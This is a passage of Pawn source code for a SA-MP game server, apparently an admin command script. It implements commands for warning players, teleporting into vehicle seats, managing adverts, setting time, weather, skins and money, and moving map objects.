				//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_warns, server_statistic_kicks) VALUES (CURDATE(), 1, 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_warns` = server_statistic_warns +1, `server_statistic_kicks` = server_statistic_kicks +1", false, "", "");
			} else {
				ResetPlayerWeapons(giveplayerid);
				player[giveplayerid][warnings] = 1;
				format(tmps1, sizeof(tmps1), "Admin %s warned %s (id: %d) [Reason: %s] [Warnings: 1/2]", playername, giveplayername, giveplayerid, params[strlen(tmps2)+1]);
				SendServerMessageToAll(EMBED_ORANGE, tmps1);
	   			GameTextForPlayer(giveplayerid, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~y~YOU WERE WARNED BY AN ADMIN!", 6000, 3);
	   			player[playerid][lastwarned] = giveplayerid;
	   			
				//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_warns) VALUES (CURDATE(), 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_warns` = server_statistic_warns +1", false, "", "");
   			}
			printflog("ADM-MSG", tmps1);
			format(ircstring, sizeof(ircstring), "7,1%s", tmps1);
			IRC_GroupSay(1, IRC_CHANNEL, ircstring);
		}
		SendCommandMessageToAdmins(playerid, "warn");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_gotoseat(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /gotoseat <name|id/out> <seatID>");

	if (!strcmp(tmps2, "out", true))
	{
		player[playerid][antifall] = 0;
   		GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
   		//SpawnPlayer(playerid);
   		SetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]+2);
   		SendCommandMessageToAdmins(playerid, "gotoseat out");
	    return 1;
	}

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (!strlen(params[strlen(tmps2)+1]))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /gotoseat <name|id> <seatID>");

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
 		if (giveplayerid == playerid)
	    return SendClientMessage(playerid, COLOR_WHITE, "You can't gotoseat yourself");

		if (!IsPlayerSpawned(giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "This player didn't spawn yet.");

		if (!IsPlayerInAnyVehicle(giveplayerid))
		return SendClientMessage(playerid, COLOR_DARKRED, "This player is not in a vehicle");

		new vID = GetPlayerVehicleID(giveplayerid);
		if (RCVehicles(vID))
		return SendErrorMessage(playerid, EMBED_WHITE, "RC Vehicles are disabled with gotoseat.");

		if (player[giveplayerid][gotomode] == 0)
		{
			if (IsPlayerAdminLevel(playerid, 3))
			{
			    if (player[playerid][ADMIN] < player[giveplayerid][ADMIN]) return SendErrorMessage(playerid, EMBED_WHITE, "This player does not allow teleporting to him/her.");
			    else SendClientMessage(playerid, COLOR_WHITE, "[INFO]: This player has goto off");
			} else return SendErrorMessage(playerid, EMBED_WHITE, "This player does not allow teleporting to him/her.");
		}

		new Float:X,
		 	Float:Y,
		 	Float:Z;

		GetPlayerPos(giveplayerid, X, Y, Z);
		SetPlayerPos(playerid, X, Y, Z+15);
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
		SendClientMessage(playerid, COLOR_ORANGE, "[WARNING]: To get out of the vehicle type /gotoseat out");
	    PutPlayerInVehicle(playerid, vID, strval(params[strlen(tmps2)+1]));
		SendCommandMessageToAdmins(playerid, "gotoseat");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_miniguns(playerid,params[])
{
	#pragma unused params

 	new miniguns,
	 	//weapons[13][2];
	 	weapons[2];

  	for (new i = 0; i < MAX_PLAYERS; i++)
  	{
  	    if (IsPlayerConnected(i))
  	    {
			/*for (new w = 0; w < 13; w++)
			{
			    GetPlayerWeaponData(i, w, weapons[w][0], weapons[w][1]);

  	            if (weapons[w][0] == 38)
  	            {
				    if (miniguns == 0)
					{
				   		SendClientMessage(playerid, COLOR_IVORY, "* List of players with a minigun:");
						miniguns = 1;
					}
					GetPlayerName(i, playername, sizeof(playername));
					format(strings, sizeof(strings), "* %s (id: %d - Ammo: %d)", playername, i, weapons[w][1]);
					SendClientMessage(playerid, COLOR_IVORY, strings);
				}
			}*/

		    GetPlayerWeaponData(i, 7, weapons[0], weapons[1]);

			if (weapons[0] == 38)
   			{
			    if (miniguns == 0)
				{
			   		SendClientMessage(playerid, COLOR_IVORY, "* List of players with a minigun:");
					miniguns = 1;
				}
				GetPlayerName(i, playername, sizeof(playername));
				format(strings, sizeof(strings), "* %s (id: %d - Ammo: %d)", playername, i, weapons[1]);
				SendClientMessage(playerid, COLOR_IVORY, strings);
			}
		}
	}
	if (miniguns == 0) SendClientMessage(playerid, COLOR_IVORY, "* No players with a minigun detected.");
	return 1;
}

dcmd_advert(playerid,params[])
{
	new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /advert <show/list/add/remove>");

	if (!strcmp(tmps2, "show", true))
	{
		Advert();
		return 1;
	} else if (!strcmp(tmps2, "list", true))
	{
		mysql_run_query(mysqlConnection, "SELECT * FROM "MYSQL_TABLE_ADVERTS" ORDER BY `advert_id` DESC", true, "QS_LoadAdsList", "ii", playerid, player[playerid][cinc]);
		return 1;
	} else if (!strcmp(tmps2, "add", true))
	{
		if (!IsPlayerAdminLevel(playerid, 5))
		return SendErrorMessage(playerid, EMBED_WHITE, "Access denied.");

		new advertID,
		    advertMsg[113];

		if (sscanf(params[strlen(tmps2)+1], "p<|>ds[113]", advertID, advertMsg))
		{
			SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /advert add <id> <message> [Max. 113 CHARACTERS]");
			SendClientMessage(playerid, COLOR_DARKRED , "Available colours: -RED, -(L)BLUE, -ORANGE, -(L)GREEN, -PINK, -GREY, -WHITE, -(L)PURPLE");
			return 1;
		}

		new mysqlStr[75];
	 	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_ADVERTS" WHERE advert_id = %d LIMIT 1", advertID);
		mysql_run_query(mysqlConnection, mysqlStr, true, "QS_CreateAdd", "iiis", playerid, player[playerid][cinc], advertID, advertMsg);
		return 1;
	} else if (!strcmp(tmps2, "remove", true))
	{
		if (!IsPlayerAdminLevel(playerid, 5))
		return SendErrorMessage(playerid, EMBED_WHITE, "Access denied.");

		tmps2 = strtok(params, idx);
		if (!strlen(tmps2))
		return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /advert remove <id>");
		new advertid = strval(tmps2);

		new mysqlStr[75];
	 	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_ADVERTS" WHERE advert_id = %d LIMIT 1", advertid);
		mysql_run_query(mysqlConnection, mysqlStr, true, "QS_RemoveAdd", "iii", playerid, player[playerid][cinc], advertid);
		return 1;
	}
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /advert <show/list/add/remove>");
}

dcmd_clear(playerid,params[])
{
	#pragma unused playerid, params

	for (new chatline = 0; chatline < 50; chatline++)
	SendClientMessageToAll(COLOR_WHITE, " ");

	SendCommandMessageToAdmins(playerid, "clear");
	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "Chat cleared by admin %s (%d).", playername, playerid);
  	IRC_GroupSay(1, IRC_CHANNEL, strings);
	return 1;
}

dcmd_setcolours(playerid,params[])
return dcmd_setcolors(playerid,params);

dcmd_setcolors(playerid,params[])
{
	#pragma unused params

	GetPlayerName(playerid, playername, sizeof(playername));
	if (acolour == true)
	{
	    acolour = false;
		format(strings, sizeof(strings), "Admin %s has "EMBED_RED"DISABLED"EMBED_WHITE" coloured chat for VIPs.", playername);
		format(tmps2, sizeof(tmps2), "2Admin %s has DISABLED coloured chat for VIPs.", playername);
	} else {
		acolour = true;
		format(strings, sizeof(strings), "Admin %s has "EMBED_GREEN"ENABLED"EMBED_WHITE" coloured chat for VIPs.", playername);
		format(tmps2, sizeof(tmps2), "2Admin %s has ENABLED coloured chat for VIPs.", playername);
	}
	SendServerMessageToAll(EMBED_WHITE, strings);
	IRC_GroupSay(1, IRC_CHANNEL, tmps2);
	SendCommandMessageToAdmins(playerid, "setcolours");
	return 1;
}

dcmd_settime(playerid, params[])
{
	new hours;

	if (!strlen(params) || !IsNumeric(params))
  	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /sett(ime) <0-23>");
	hours = strval(params);

	if (hours < 0 || hours > 23)
  	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /sett(ime) <0-23>");

	SetWorldTime(hours);
	stime = hours;
	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "Admin %s has set the time to %d.", playername, hours);
	SendServerMessageToAll(EMBED_WHITE, strings);
	SendCommandMessageToAdmins(playerid, "sett(ime)");
	return 1;
}

dcmd_sett(playerid,params[])
{
	return dcmd_settime(playerid,params);
}

dcmd_setweather(playerid, params[])
{
	new weather;

	if (!strlen(params) || !IsNumeric(params))
 	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setw(eather) <0 to 50>");
	weather = strval(params);

	if (weather < 0 || weather > 500)
 	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setw(weather) <0 to 50>");

    SetWeather(weather);
    sweather = weather;
	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "Admin %s has set the weather to %d.", playername, weather);
	SendServerMessageToAll(EMBED_WHITE, strings);
	SendCommandMessageToAdmins(playerid, "setw(eather)");
	return 1;
}

dcmd_setw(playerid,params[])
{
	return dcmd_setweather(playerid,params);
}

dcmd_count(playerid,params[])
return dcmd_countdown(playerid,params);

dcmd_countdown(playerid,params[])
{ // Donny
	#pragma unused params

	if (Count == 5)
	{
		CountDown();
		SendCommandMessageToAdmins(playerid, "countdown");
	} else SendErrorMessage(playerid, EMBED_WHITE, "Countdown already in progress");
	return 1;
}

dcmd_removestick(playerid,params[])
{
	new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /removestick <name|id/all>");

	if (!strcmp(tmps2, "all", true))
	{
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
		    if (IsPlayerConnected(i) && IsPlayerSpawned(i))
			{
				for (new o = 0; o < VIP_MAX_OSTICKS; o++)
				{
					if (pSObject[i][o][so_model] != -1)
					{
						if (pSObject[i][o][so_object] != -1)
						DestroyObject(pSObject[i][o][so_object]);
						
						pSObject[i][o][so_object] 		= -1;
						pSObject[i][o][so_model] 		= -1;
						pSObject[i][i][so_isvehicle]	= 0;
						pSObject[i][i][so_vehiclemodel]	= 0;
						pSObject[i][o][so_x]     		= 0.0;
						pSObject[i][o][so_y]     		= 0.0;
						pSObject[i][o][so_z]     		= 0.0;
						pSObject[i][o][so_rx]    		= 0.0;
						pSObject[i][o][so_ry]    		= 0.0;
						pSObject[i][o][so_rz]   		= 0.0;
					}
				}
				player[i][ostickc] = 0;

				for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
				{
					if (IsPlayerAttachedObjectSlotUsed(i, pi))
					{
						RemovePlayerAttachedObject(i, pi);
						pAObject[i][pi][ao_model]	= -1;
						pAObject[i][pi][ao_bone]	= 0;
						pAObject[i][pi][ao_x]		= 0.0;
						pAObject[i][pi][ao_y]		= 0.0;
						pAObject[i][pi][ao_z]		= 0.0;
						pAObject[i][pi][ao_rx]		= 0.0;
						pAObject[i][pi][ao_ry]		= 0.0;
						pAObject[i][pi][ao_rz]		= 0.0;
						pAObject[i][pi][ao_sx]		= 1.0;
						pAObject[i][pi][ao_sy]		= 1.0;
						pAObject[i][pi][ao_sz]		= 1.0;
					}
				}
				player[i][postickc] = 0;
			}
		}
		SendCommandMessageToAdmins(playerid, "removestick");
		return 1;
	}

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (!IsPlayerConnected(giveplayerid) || giveplayerid == INVALID_PLAYER_ID)
	return SendErrorMessage(playerid, EMBED_WHITE, "Player is not connected!");

	if (!IsPlayerSpawned(giveplayerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

	if (!IsAdmin(playerid) && IsAdmin(giveplayerid))
	return 1;

	for (new i = 0; i < VIP_MAX_OSTICKS; i++)
	{
		if (pSObject[giveplayerid][i][so_model] != -1)
		{
			if (pSObject[giveplayerid][i][so_object] != -1)
			DestroyObject(pSObject[giveplayerid][i][so_object]);
			
			pSObject[giveplayerid][i][so_object] 		= -1;
			pSObject[giveplayerid][i][so_model] 		= -1;
			pSObject[giveplayerid][i][so_isvehicle]		= 0;
			pSObject[giveplayerid][i][so_vehiclemodel]	= 0;
			pSObject[giveplayerid][i][so_x]     		= 0.0;
			pSObject[giveplayerid][i][so_y]     		= 0.0;
			pSObject[giveplayerid][i][so_z]     		= 0.0;
			pSObject[giveplayerid][i][so_rx]    		= 0.0;
			pSObject[giveplayerid][i][so_ry]    		= 0.0;
			pSObject[giveplayerid][i][so_rz]    		= 0.0;
		}
	}
	player[giveplayerid][ostickc] = 0;

	for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
	{
		if (IsPlayerAttachedObjectSlotUsed(giveplayerid, pi))
		{
			RemovePlayerAttachedObject(giveplayerid, pi);
			pAObject[giveplayerid][pi][ao_model]	= -1;
			pAObject[giveplayerid][pi][ao_bone]		= 0;
			pAObject[giveplayerid][pi][ao_x]		= 0.0;
			pAObject[giveplayerid][pi][ao_y]		= 0.0;
			pAObject[giveplayerid][pi][ao_z]		= 0.0;
			pAObject[giveplayerid][pi][ao_rx]		= 0.0;
			pAObject[giveplayerid][pi][ao_ry]		= 0.0;
			pAObject[giveplayerid][pi][ao_rz]		= 0.0;
			pAObject[giveplayerid][pi][ao_sx]		= 1.0;
			pAObject[giveplayerid][pi][ao_sy]		= 1.0;
			pAObject[giveplayerid][pi][ao_sz]		= 1.0;
		}
	}
	player[giveplayerid][postickc] = 0;

	SendCommandMessageToAdmins(playerid, "removestick");
	return 1;
}

dcmd_setskin(playerid,params[])
{
	new idx,
		skin;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /setskin <name|id> <skin>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_DARKRED , "[USAGE]: /setskin <name|id> <skin>");
	skin = strval(tmps2);

	if (!IsPlayerConnected(giveplayerid) || giveplayerid == INVALID_PLAYER_ID)
	return SendErrorMessage(playerid, EMBED_WHITE, "Player is not connected!");

	if (!IsPlayerSpawned(giveplayerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

	if (!IsAdmin(playerid) && IsAdmin(giveplayerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "Cannot set skin of an admin");

	if (skin < 0 || skin > 299 || skin == 74)
	return SendErrorMessage(playerid, EMBED_WHITE, "This skinID is not valid");

	SetPlayerSkin(giveplayerid, skin);
	SendCommandMessageToAdmins(playerid, "setskin");
	return 1;
}

dcmd_setmoney(playerid,params[])
{
	new idx,
	 	moneys;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /setmoney <name|id> <amount>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /setmoney <name|id> <amount>");
	moneys = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

  		ResetPlayerMoney(giveplayerid);
		GivePlayerMoney(giveplayerid, moneys);
		SendCommandMessageToAdmins(playerid, "setmoney");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_map(playerid,params[])
{
	new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /map <gc(getclosest)/move>");

	if (!strcmp(tmps2, "gc",true) || !strcmp(tmps2, "getclosest",true))
	{
		CallRemoteFunction("GetClosestMapObject", "i", playerid);
		SendCommandMessageToAdmins(playerid, "map gc(getclosest)");
		return 1;
	} else if (!strcmp(tmps2, "move",true))
	{
	    new mapobjectid,
			Float:oX,
		    Float:oY,
		    Float:oZ,
	    	Float:orX,
	        Float:orY,
	        Float:orZ;
	
		tmps2 = strtok(params, idx);
		if (!strlen(tmps2) || !IsNumeric(tmps2) || strval(tmps2) < 1)
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /map move <mapobjectID X Y Z Speed rX rY rZ>");
		mapobjectid = strval(tmps2);

		tmps2 = strtok(params, idx);
		if (!strlen(tmps2) || !IsNumeric(tmps2))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /map move <objectID X Y Z Speed rX rY rZ>");
		oX = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (!strlen(tmps2) || !IsNumeric(tmps2))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /map move <objectID X Y Z Speed rX rY rZ>");
		oY = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (!strlen(tmps2) || !IsNumeric(tmps2))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /map move <objectID X Y Z Speed rX rY rZ>");
		oZ = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (!strlen(tmps2) || !IsNumeric(tmps2))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /map move <objectID X Y Z Speed rX rY rZ>");
		new Float:Speed = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (strlen(tmps2) && IsNumeric(tmps2))
		orX = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (strlen(tmps2) && IsNumeric(tmps2))
		orY = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (strlen(tmps2) && IsNumeric(tmps2))
		orZ = floatstr(tmps2);

		CallRemoteFunction("MoveMapObject", "ddfffffff", playerid, mapobjectid, oX, oY, oZ, Speed, orX, orY, orZ);
		SendCommandMessageToAdmins(playerid, "map move");
		return 1;
	}
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /map <gc(getclosest)>");
}

dcmd_object(playerid,params[])
{
	new idx,
		objectid,
		Float:X = 0.0,
		Float:Y = 0.0,
		Float:Z = 0.0;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /object <go/gc(getclosest)/set/rotate/move/stop>");

	if (!strcmp(tmps2, "move",true))
	{
		tmps2 = strtok(params, idx);
		if (!strlen(tmps2) || !IsNumeric(tmps2) || strval(tmps2) < 0)
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /object move <objectID X Y Z Speed rX rY rZ/objectID tome Speed>");
		objectid = strval(tmps2);

	    new Float:rX,
	        Float:rY,
	        Float:rZ,
			Float:oX,
		    Float:oY,
		    Float:oZ,
	    	Float:orX,
	        Float:orY,
	        Float:orZ;

		tmps2 = strtok(params, idx);
		if (strlen(tmps2))
		{
		    if (IsNumeric(tmps2))
		    {
			    oX = floatstr(tmps2);
			} else if (!strcmp(tmps2, "tome", true))
			{
				tmps2 = strtok(params, idx);
				if (!strlen(tmps2) || !IsNumeric(tmps2))
				return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /object move <objectID tome Speed>");
				new Float:Speed = floatstr(tmps2);

				if (IsValidDynamicObject(objectid))
				{
				    GetPlayerPos(playerid, X, Y, Z);
				    GetDynamicObjectRot(objectid, rX, rY, rZ);
					MoveDynamicObject(objectid, X, Y, Z, Speed, rX, rY, rZ);
					SendCommandMessageToAdmins(playerid, "object move");
				} else SendErrorMessage(playerid, EMBED_WHITE, "This is not a valid objectID.");
				return 1;
			} else return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /object move <objectID X Y Z Speed rX rY rZ/objectID tome Speed>");
		} else return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /object move <objectID X Y Z Speed rX rY rZ/objectID tome Speed>");

		tmps2 = strtok(params, idx);
		if (!strlen(tmps2) || !IsNumeric(tmps2))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /object move <objectID X Y Z Speed rX rY rZ>");
		oY = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (!strlen(tmps2) || !IsNumeric(tmps2))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /object move <objectID X Y Z Speed rX rY rZ>");
		oZ = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (!strlen(tmps2) || !IsNumeric(tmps2))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /object move <objectID X Y Z Speed rX rY rZ>");
		new Float:Speed = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (strlen(tmps2) && IsNumeric(tmps2))
		orX = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (strlen(tmps2) && IsNumeric(tmps2))
		orY = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (strlen(tmps2) && IsNumeric(tmps2))
		orZ = floatstr(tmps2);

		if (IsValidDynamicObject(objectid))
		{
  			GetDynamicObjectPos(objectid, X, Y, Z);
	    	GetDynamicObjectRot(objectid, rX, rY, rZ);
			MoveDynamicObject(objectid, X + oX, Y + oY, Z + oZ, Speed, rX + orX, rY + orY, rZ + orZ);
			SendCommandMessageToAdmins(playerid, "object move");
		} else SendErrorMessage(playerid, EMBED_WHITE, "This is not a valid objectID.");
		return 1;
	}

	if (!strcmp(tmps2, "go",true))
	{
		tmps2 = strtok(params, idx);
		if (!strlen(tmps2) || !IsNumeric(tmps2))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /object go <objectID (X_offset Y_offset Z_offset)>");
		objectid = strval(tmps2);

		if (IsValidDynamicObject(objectid))
		{
			tmps2 = strtok(params, idx);
			if (strlen(tmps2) || IsNumeric(tmps2))
			X = floatstr(tmps2);

			tmps2 = strtok(params, idx);
			if (strlen(tmps2) || IsNumeric(tmps2))
			Y = floatstr(tmps2);

			tmps2 = strtok(params, idx);
			if (strlen(tmps2) || IsNumeric(tmps2))
			Z = floatstr(tmps2);

			new Float:oX, Float:oY, Float:oZ;
			GetDynamicObjectPos(objectid, oX, oY, oZ);
			SetPlayerPos(playerid, oX+X, oY+Y, oZ+Z);
			SendCommandMessageToAdmins(playerid, "object go");
		} else SendErrorMessage(playerid, EMBED_WHITE, "This is not a valid objectID.");
		return 1;
	}

	if (!strcmp(tmps2, "gc",true) || !strcmp(tmps2, "getclosest",true))
	{
		new closestobjectID = -1,
			objectdistance,
			closestobjectdistance = 1000,
			Float:pX,
			Float:pY,
			Float:pZ,
			Float:rX,
			Float:rY,
			Float:rZ;

		tmps2 = strtok(params, idx);
		if (strlen(tmps2))
		{
			if (!IsNumeric(tmps2)) return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /object gc (<distance[Max. 1000]>)");
			else closestobjectdistance = strval(tmps2);
		} else closestobjectdistance = 1000;

		GetPlayerPos(playerid, pX, pY, pZ);
		//for (new objectid = 0; objectid <= 10000; objectid++) // CountDynamicObjects + IsValidDynamicObject
		for (objectid = 0; objectid <= CountDynamicObjects(); objectid++)
		{
			if (IsValidDynamicObject(objectid))
			{
				GetDynamicObjectPos(objectid, X, Y, Z);
	   			objectdistance = floatround(floatsqroot(floatpower(floatabs(floatsub(pX, X)),2)+floatpower(floatabs(floatsub(pY,Y)),2)+floatpower(floatabs(floatsub(pZ,Z)),2)));
				if (objectdistance < closestobjectdistance)
				{
					closestobjectdistance = objectdistance;
					closestobjectID = objectid;
				}
	  		}
		}
		if (closestobjectID == -1) return SendErrorMessage(playerid, EMBED_WHITE, "Could not find closest object");
		else {
		    GetDynamicObjectPos(closestobjectID, X, Y, Z);
		    GetDynamicObjectRot(closestobjectID, rX, rY, rZ);
			SetPlayerCheckpoint(playerid, X, Y, Z, 5.0);
			format(strings, sizeof(strings), "Closest object found: %d (X: %0.2f Y: %0.2f Z: %0.2f rX: %0.2f rY: %0.2f rZ: %0.2f) [/object cp to delete CP]", closestobjectID, X, Y, Z, rX, rY, rZ);
			SendClientMessage(playerid, COLOR_YELLOW, strings);
		}
		SendCommandMessageToAdmins(playerid, "object gc(getclosest)");
		return 1;
	}


	if (!strcmp(tmps2, "cp",true))
	return DisablePlayerCheckpoint(playerid);

	if (!strcmp(tmps2, "set",true))
	{
		tmps2 = strtok(params, idx);
		if (!strlen(tmps2) || !IsNumeric(tmps2))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /object set <objectID X Y Z>");
		objectid = strval(tmps2);

		tmps2 = strtok(params, idx);
		if (strlen(tmps2) || IsNumeric(tmps2))
		X = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (strlen(tmps2) || IsNumeric(tmps2))
		Y = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (strlen(tmps2) || IsNumeric(tmps2))
		Z = floatstr(tmps2);

		if (IsValidDynamicObject(objectid))
		{
			SetDynamicObjectPos(objectid, X, Y, Z);
			SendCommandMessageToAdmins(playerid, "object set");
		} else SendErrorMessage(playerid, EMBED_WHITE, "This is not a valid objectID.");
		return 1;
	}

	if (!strcmp(tmps2, "rotate",true))
	{
		tmps2 = strtok(params, idx);
		if (!strlen(tmps2) || !IsNumeric(tmps2))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /object rotate <objectID X Y Z>");

		if (IsNumeric(tmps2) &&  strval(tmps2) >= 0) objectid = strval(tmps2);

		tmps2 = strtok(params, idx);
		if (strlen(tmps2) || IsNumeric(tmps2))
		X = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (strlen(tmps2) || IsNumeric(tmps2))
		Y = floatstr(tmps2);

		tmps2 = strtok(params, idx);
		if (strlen(tmps2) || IsNumeric(tmps2))
		Z = floatstr(tmps2);

		if (IsValidDynamicObject(objectid))
		{
			SetDynamicObjectRot(objectid, X, Y, Z);
			SendCommandMessageToAdmins(playerid, "object rotate");
		} else SendErrorMessage(playerid, EMBED_WHITE, "This is not a valid objectID.");
		return 1;
	}

	if (!strcmp(tmps2, "stop",true))
	{
		tmps2 = strtok(params, idx);
		if (!strlen(tmps2) || !IsNumeric(tmps2))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /object stop <objectID>");

		if (IsNumeric(tmps2) &&  strval(tmps2) >= 0) objectid = strval(tmps2);

		if (IsValidDynamicObject(objectid))
		{
			StopDynamicObject(objectid);
			SendCommandMessageToAdmins(playerid, "object stop");
		} else SendErrorMessage(playerid, EMBED_WHITE, "This is not a valid objectID.");
		return 1;
	}
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /object <gc(getclosest)/set/rotate/move>");
}

dcmd_sc(playerid,params[])
{ // Joshua Yu
	#pragma unused params

	if (!IsPlayerDriver(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle");

	player[playerid][savedvehicle] = GetPlayerVehicleID(playerid);
	SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Vehicle saved! (/sp to bring)");
	return 1;
}

dcmd_sp(playerid,params[])
{ // Joshua Yu
	#pragma unused params

	if (player[playerid][savedvehicle] == -1 || !GetVehicleModel(player[playerid][savedvehicle]))
	return SendErrorMessage(playerid, EMBED_WHITE, "No vehicle saved. (Destroyed)");

   	GetPlayerPos(playerid,playerxyza[0], playerxyza[1], playerxyza[2]);
   	GetPlayerFacingAngle(playerid, playerxyza[3]);
   	SetVehicleZAngle(player[playerid][savedvehicle], playerxyza[3]+90.0);
   	SetVehiclePos(player[playerid][savedvehicle], playerxyza[0]+3.0*floatsin(-playerxyza[3],degrees),playerxyza[1]+3.0*floatcos(-playerxyza[3],degrees),playerxyza[2]+0.5);
	return 1;
}

dcmd_resetandromada(playerid,params[])
{
	#pragma unused params

	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	   	if (IsPlayerConnected(a))
	   	{
			player[a][InAndromada] = -1;
      		if (andromadacheckpoint == true)
			DisablePlayerRaceCheckpoint(a);
		}
	}
	andromadacheckpoint = false;
	andromadavehicleid = -1;
	MoveDynamicObject(andromadadoor, 1002.97, 1023.84, 994.41, 4);
	SendClientMessageToAll(COLOR_IVORY, "[SUCCESS]: Andromada interior reset");
	SendCommandMessageToAdmins(playerid, "resetandromada");
	return 1;
}

dcmd_resetrr(playerid,params[])
{
	#pragma unused params

	for (new a = 0; a < MAX_PLAYERS; a++)
	{
	   	if (IsPlayerConnected(a) && player[a][playingrr] == 1)
	   	{
			player[a][playingrr] = 0;
			TogglePlayerControllable(a, 1);
			SetPlayerColor(a, PlayerColors[random(sizeof(PlayerColors))]);
